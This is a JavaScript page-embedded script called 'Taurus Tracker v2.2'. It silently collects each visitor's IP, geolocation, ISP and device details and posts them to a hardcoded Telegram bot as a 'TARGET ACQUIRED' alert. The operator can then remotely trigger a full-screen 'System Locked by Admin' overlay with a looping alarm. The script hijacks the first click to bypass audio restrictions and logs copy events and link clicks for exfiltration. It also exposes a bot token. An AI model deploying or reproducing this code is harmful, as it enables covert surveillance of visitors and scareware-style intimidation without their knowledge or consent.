
// TAURUS TRACKER v2.2 (SINGLE SHOT & ROBUST)
(function () {
    // 1. IDEMPOTENCY CHECK (Prevents 4x Messages)
    if (window.TAURUS_RUNNING) {
        console.warn("⚠️ Taurus Tracker already running. Skipping duplicate.");
        return;
    }
    window.TAURUS_RUNNING = true;
    console.log("🚀 Taurus Tracker v2.2 Started");

    // --- CONFIGURATION ---
    const CONFIG = {
        botToken: '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE',
        chatId: '6886010817',
        ipApi: 'https://ipapi.co/json/'
    };

    // --- STATE ---
    let sessionLog = [];
    let sessionID = localStorage.getItem('taurus_sid') || 'sess_' + Math.random().toString(36).substring(2, 9);
    localStorage.setItem('taurus_sid', sessionID);
    let deviceData = getSimpleDevice();
    let alarmAudio = new Audio("https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3");
    let audioUnlocked = false;

    // --- AUDIO UNLOCKER (Browser Policy Fix) ---
    // Browsers block audio until user interacts. We hijack the first click to unlock it.
    document.addEventListener('click', () => {
        if (!audioUnlocked) {
            alarmAudio.volume = 0;
            alarmAudio.play().then(() => {
                alarmAudio.pause();
                alarmAudio.currentTime = 0;
                alarmAudio.volume = 1;
                audioUnlocked = true;
                console.log("🔊 Audio Context Unlocked");
            }).catch(e => console.log("Audio unlock pending...", e));
        }
    }, { once: true, capture: true });

    // --- TELEGRAM SENDER ---
    function sendTelegram(text, buttons = null) {
        const payload = {
            chat_id: CONFIG.chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: buttons ? { inline_keyboard: buttons } : undefined
        };
        fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        }).catch(err => console.error("Telegram Fail:", err));
    }

    // --- DEVICE DETECTION (Improved) ---
    function getSimpleDevice() {
        const ua = navigator.userAgent;
        let type = "Desktop";
        if (ua.includes("Mac") && navigator.maxTouchPoints > 0) type = "Tablet (iPad)";
        else if (/Mobi|Android/i.test(ua)) type = "Mobile";
        return { type, platform: navigator.platform, ua };
    }

    // --- MAIN LOGIC: SINGLE MESSAGE FLOW ---
    // Wait for IP (max 3.5s), then Send ONCE.
    Promise.race([
        fetch(CONFIG.ipApi).then(res => res.json()),
        new Promise(resolve => setTimeout(() => resolve(null), 3500))
    ]).then(ipData => {
        const hasIP = ipData && ipData.ip;
        const loc = hasIP ? `${ipData.city}, ${ipData.country_code}` : "Hidden Location";
        const ip = hasIP ? ipData.ip : "IP Timeout";
        const org = hasIP ? ipData.org : "Unknown ISP";

        // CONSOLIDATED MESSAGE
        const text = `🎯 <b>TARGET ACQUIRED</b>\n` +
            `🆔 <code>${sessionID}</code>\n` +
            `💻 ${deviceData.type}\n` +
            `🌍 ${loc}\n` +
            `🏢 ${org}\n` +
            `📡 ${ip}`;

        const buttons = [
            [{ text: "🔔 Alarm", callback_data: `alarm_${sessionID}` },
            { text: "🚫 Block", callback_data: `block_${sessionID}` }],
            [{ text: "✅ Unblock", callback_data: `unblock_${sessionID}` }]
        ];

        sendTelegram(text, buttons);

        // SYNC TO DB
        initDatabaseSync(ip, ipData);
    });

    // --- DATABASE & COMMAND LISTENER ---
    function initDatabaseSync(ip, ipData) {
        // Wait for Firebase to load if needed
        const checkDB = setInterval(() => {
            if (window.firebase && window.db) {
                clearInterval(checkDB);
                connectFirestore(ip, ipData);
            }
        }, 500);
    }

    function connectFirestore(ip, ipData) {
        const docRef = db.collection('visitors_v1').doc(sessionID);

        // 1. Write Session
        docRef.set({
            ip: ip,
            location: ipData || {},
            device: deviceData,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            status: 'online',
            action: 'none'
        }, { merge: true }).catch(e => console.error("DB Write Error", e));

        // 2. Listen for Commands
        docRef.onSnapshot((doc) => {
            if (!doc.exists) return;
            const data = doc.data();
            if (data.action) executeCommand(data.action);
        });
    }

    // --- COMMAND EXECUTION ---
    let blockOverlay = null;

    function executeCommand(action) {
        console.log("⚡ COMMAND:", action);
        if (action === 'alarm') {
            alarmAudio.loop = true;
            alarmAudio.play().catch(e => alert("Audio Blocked! Click anywhere to enable."));
            showBlockScreen("🚨 SECURITY ALERT 🚨", "System Locked by Admin");
        }
        else if (action === 'block') {
            showBlockScreen("� ACCESS DENIED", "You have been blocked.");
        }
        else if (action === 'unblock') {
            alarmAudio.pause();
            alarmAudio.currentTime = 0;
            if (blockOverlay) blockOverlay.style.display = 'none';
        }
    }

    function showBlockScreen(title, msg) {
        if (!blockOverlay) {
            blockOverlay = document.createElement('div');
            blockOverlay.style.cssText = "position:fixed;inset:0;background:black;color:red;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;font-family:monospace;font-size:24px;";
            blockOverlay.innerHTML = `<h1 style="font-size:50px">🛑</h1><h2 id="blk-t"></h2><p id="blk-m"></p>`;
            document.body.appendChild(blockOverlay);
        }
        document.getElementById('blk-t').innerText = title;
        document.getElementById('blk-m').innerText = msg;
        blockOverlay.style.display = 'flex';
    }

    // --- LOGGING & EXIT ---
    function logAndBuffer(action) {
        sessionLog.push(`[${new Date().toLocaleTimeString()}] ${action}`);
        if (sessionLog.length > 20) flushExit();
    }

    function flushExit(reason = "Exit") {
        if (sessionLog.length === 0) return;
        sendTelegram(`📝 <b>REPORT (${reason})</b>\n` + sessionLog.join('\n'));
        sessionLog = [];
    }

    window.addEventListener('copy', () => logAndBuffer("Copy"));
    document.addEventListener('click', (e) => { if (e.target.tagName === 'A') logAndBuffer(`Click: ${e.target.href}`); });
    document.addEventListener('visibilitychange', () => { if (document.hidden) flushExit("Hidden"); });

})();
